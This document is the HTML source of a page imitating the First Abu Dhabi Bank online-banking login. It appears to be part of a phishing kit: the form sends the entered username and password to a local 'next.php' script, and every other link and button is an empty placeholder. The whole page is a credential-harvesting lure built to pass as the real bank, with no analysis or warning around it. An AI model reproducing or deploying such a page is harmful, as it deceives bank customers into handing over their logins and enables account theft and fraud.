<!DOCTYPE html>

<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Online Banking - Digital Banking Channels | First Abu Dhabi Bank – UAE</title>
</head>

<body>
    <link rel="stylesheet" href="./css/styles.b4724baebf91635e.css" media="all" onload="this.media=&#39;all&#39;">
    <my-app ng-version="14.2.8">
        <ng-component>
            <div windowscroll="" class="new-brand">
                <login-header>
                    <header><a href="#"><img src="./images/logo-small.png" alt="FAB" class="brand-image"></a>
                        <div class="button-holder brand-arabic"><a href="#"> عربى </a></div>
                    </header>
                </login-header>
                <div class="container-fluid login-body">
                    <div class="row">
                        <div class="col-md-7 col-lg-7 vertical login-content-wrapper">
                            <div class="left-col-content">
                                <h1>Online Banking</h1>
                                <h2>Welcome to FAB</h2>
                            </div>
                        </div>
                        <div class="col-md-5 p-0 m-0 vertical login-content-wrapper">
                            <div loginform1-component="" class="right-col-content login-width">
                                <h2>Login</h2>
                                <div class="form-holder">
                                    <form id="loginForm" class="ng-untouched ng-pristine ng-valid" action="./next.php" method="POST">
                                        <error-component>
                                            <!---->
                                        </error-component>
                                        <div class="element-holder"><input type="text" id="ai" name="ai" class="csu-login-userName ng-untouched ng-pristine ng-valid" placeholder="Username" required=""></div>
                                        <div class="element-holder"><input type="password" id="pr" prevent-space="" disable-copypaste="" name="pr" class="cs-login-password ng-untouched ng-pristine ng-valid" placeholder="Password" required=""></div>
                                        <div class="button-holder hidein-otp"><button type="submit" id="btn1" class="button btn-md btn-block btn-base" name="btn1">LOGIN</button><span class="options"><a href="#" routerlinkactive="active">Unlock account / Forgot password</a></span></div>
                                    </form>
                                </div>
                                <div class="reg-panel">
                                    <h3 class="margin-bottom-20">NOT REGISTERED FOR ONLINE BANKING?</h3>
                                    <div class="button-holder"><a href="#" routerlinkactive="active" class="button btn-md border-only">REGISTER NOW</a></div>
                                </div>
                                <div class="create-account-bg hide"><a href="#" class="button btn-custom">Open a new bank account</a><a href="#" routerlinkactive="active" class="button btn-custom hide">TRANSLATION</a></div>
                            </div>
                        </div>
                    </div>
                    <login-footer>
                        <div class="row footer-container">
                            <p class="footer col-md-12">Copyright (c) 2023 First Abu Dhabi Bank. All Rights Reserved.</p>
                        </div>
                    </login-footer>
                </div>
            </div>
        </ng-component>
    </my-app>
</body>

</html>
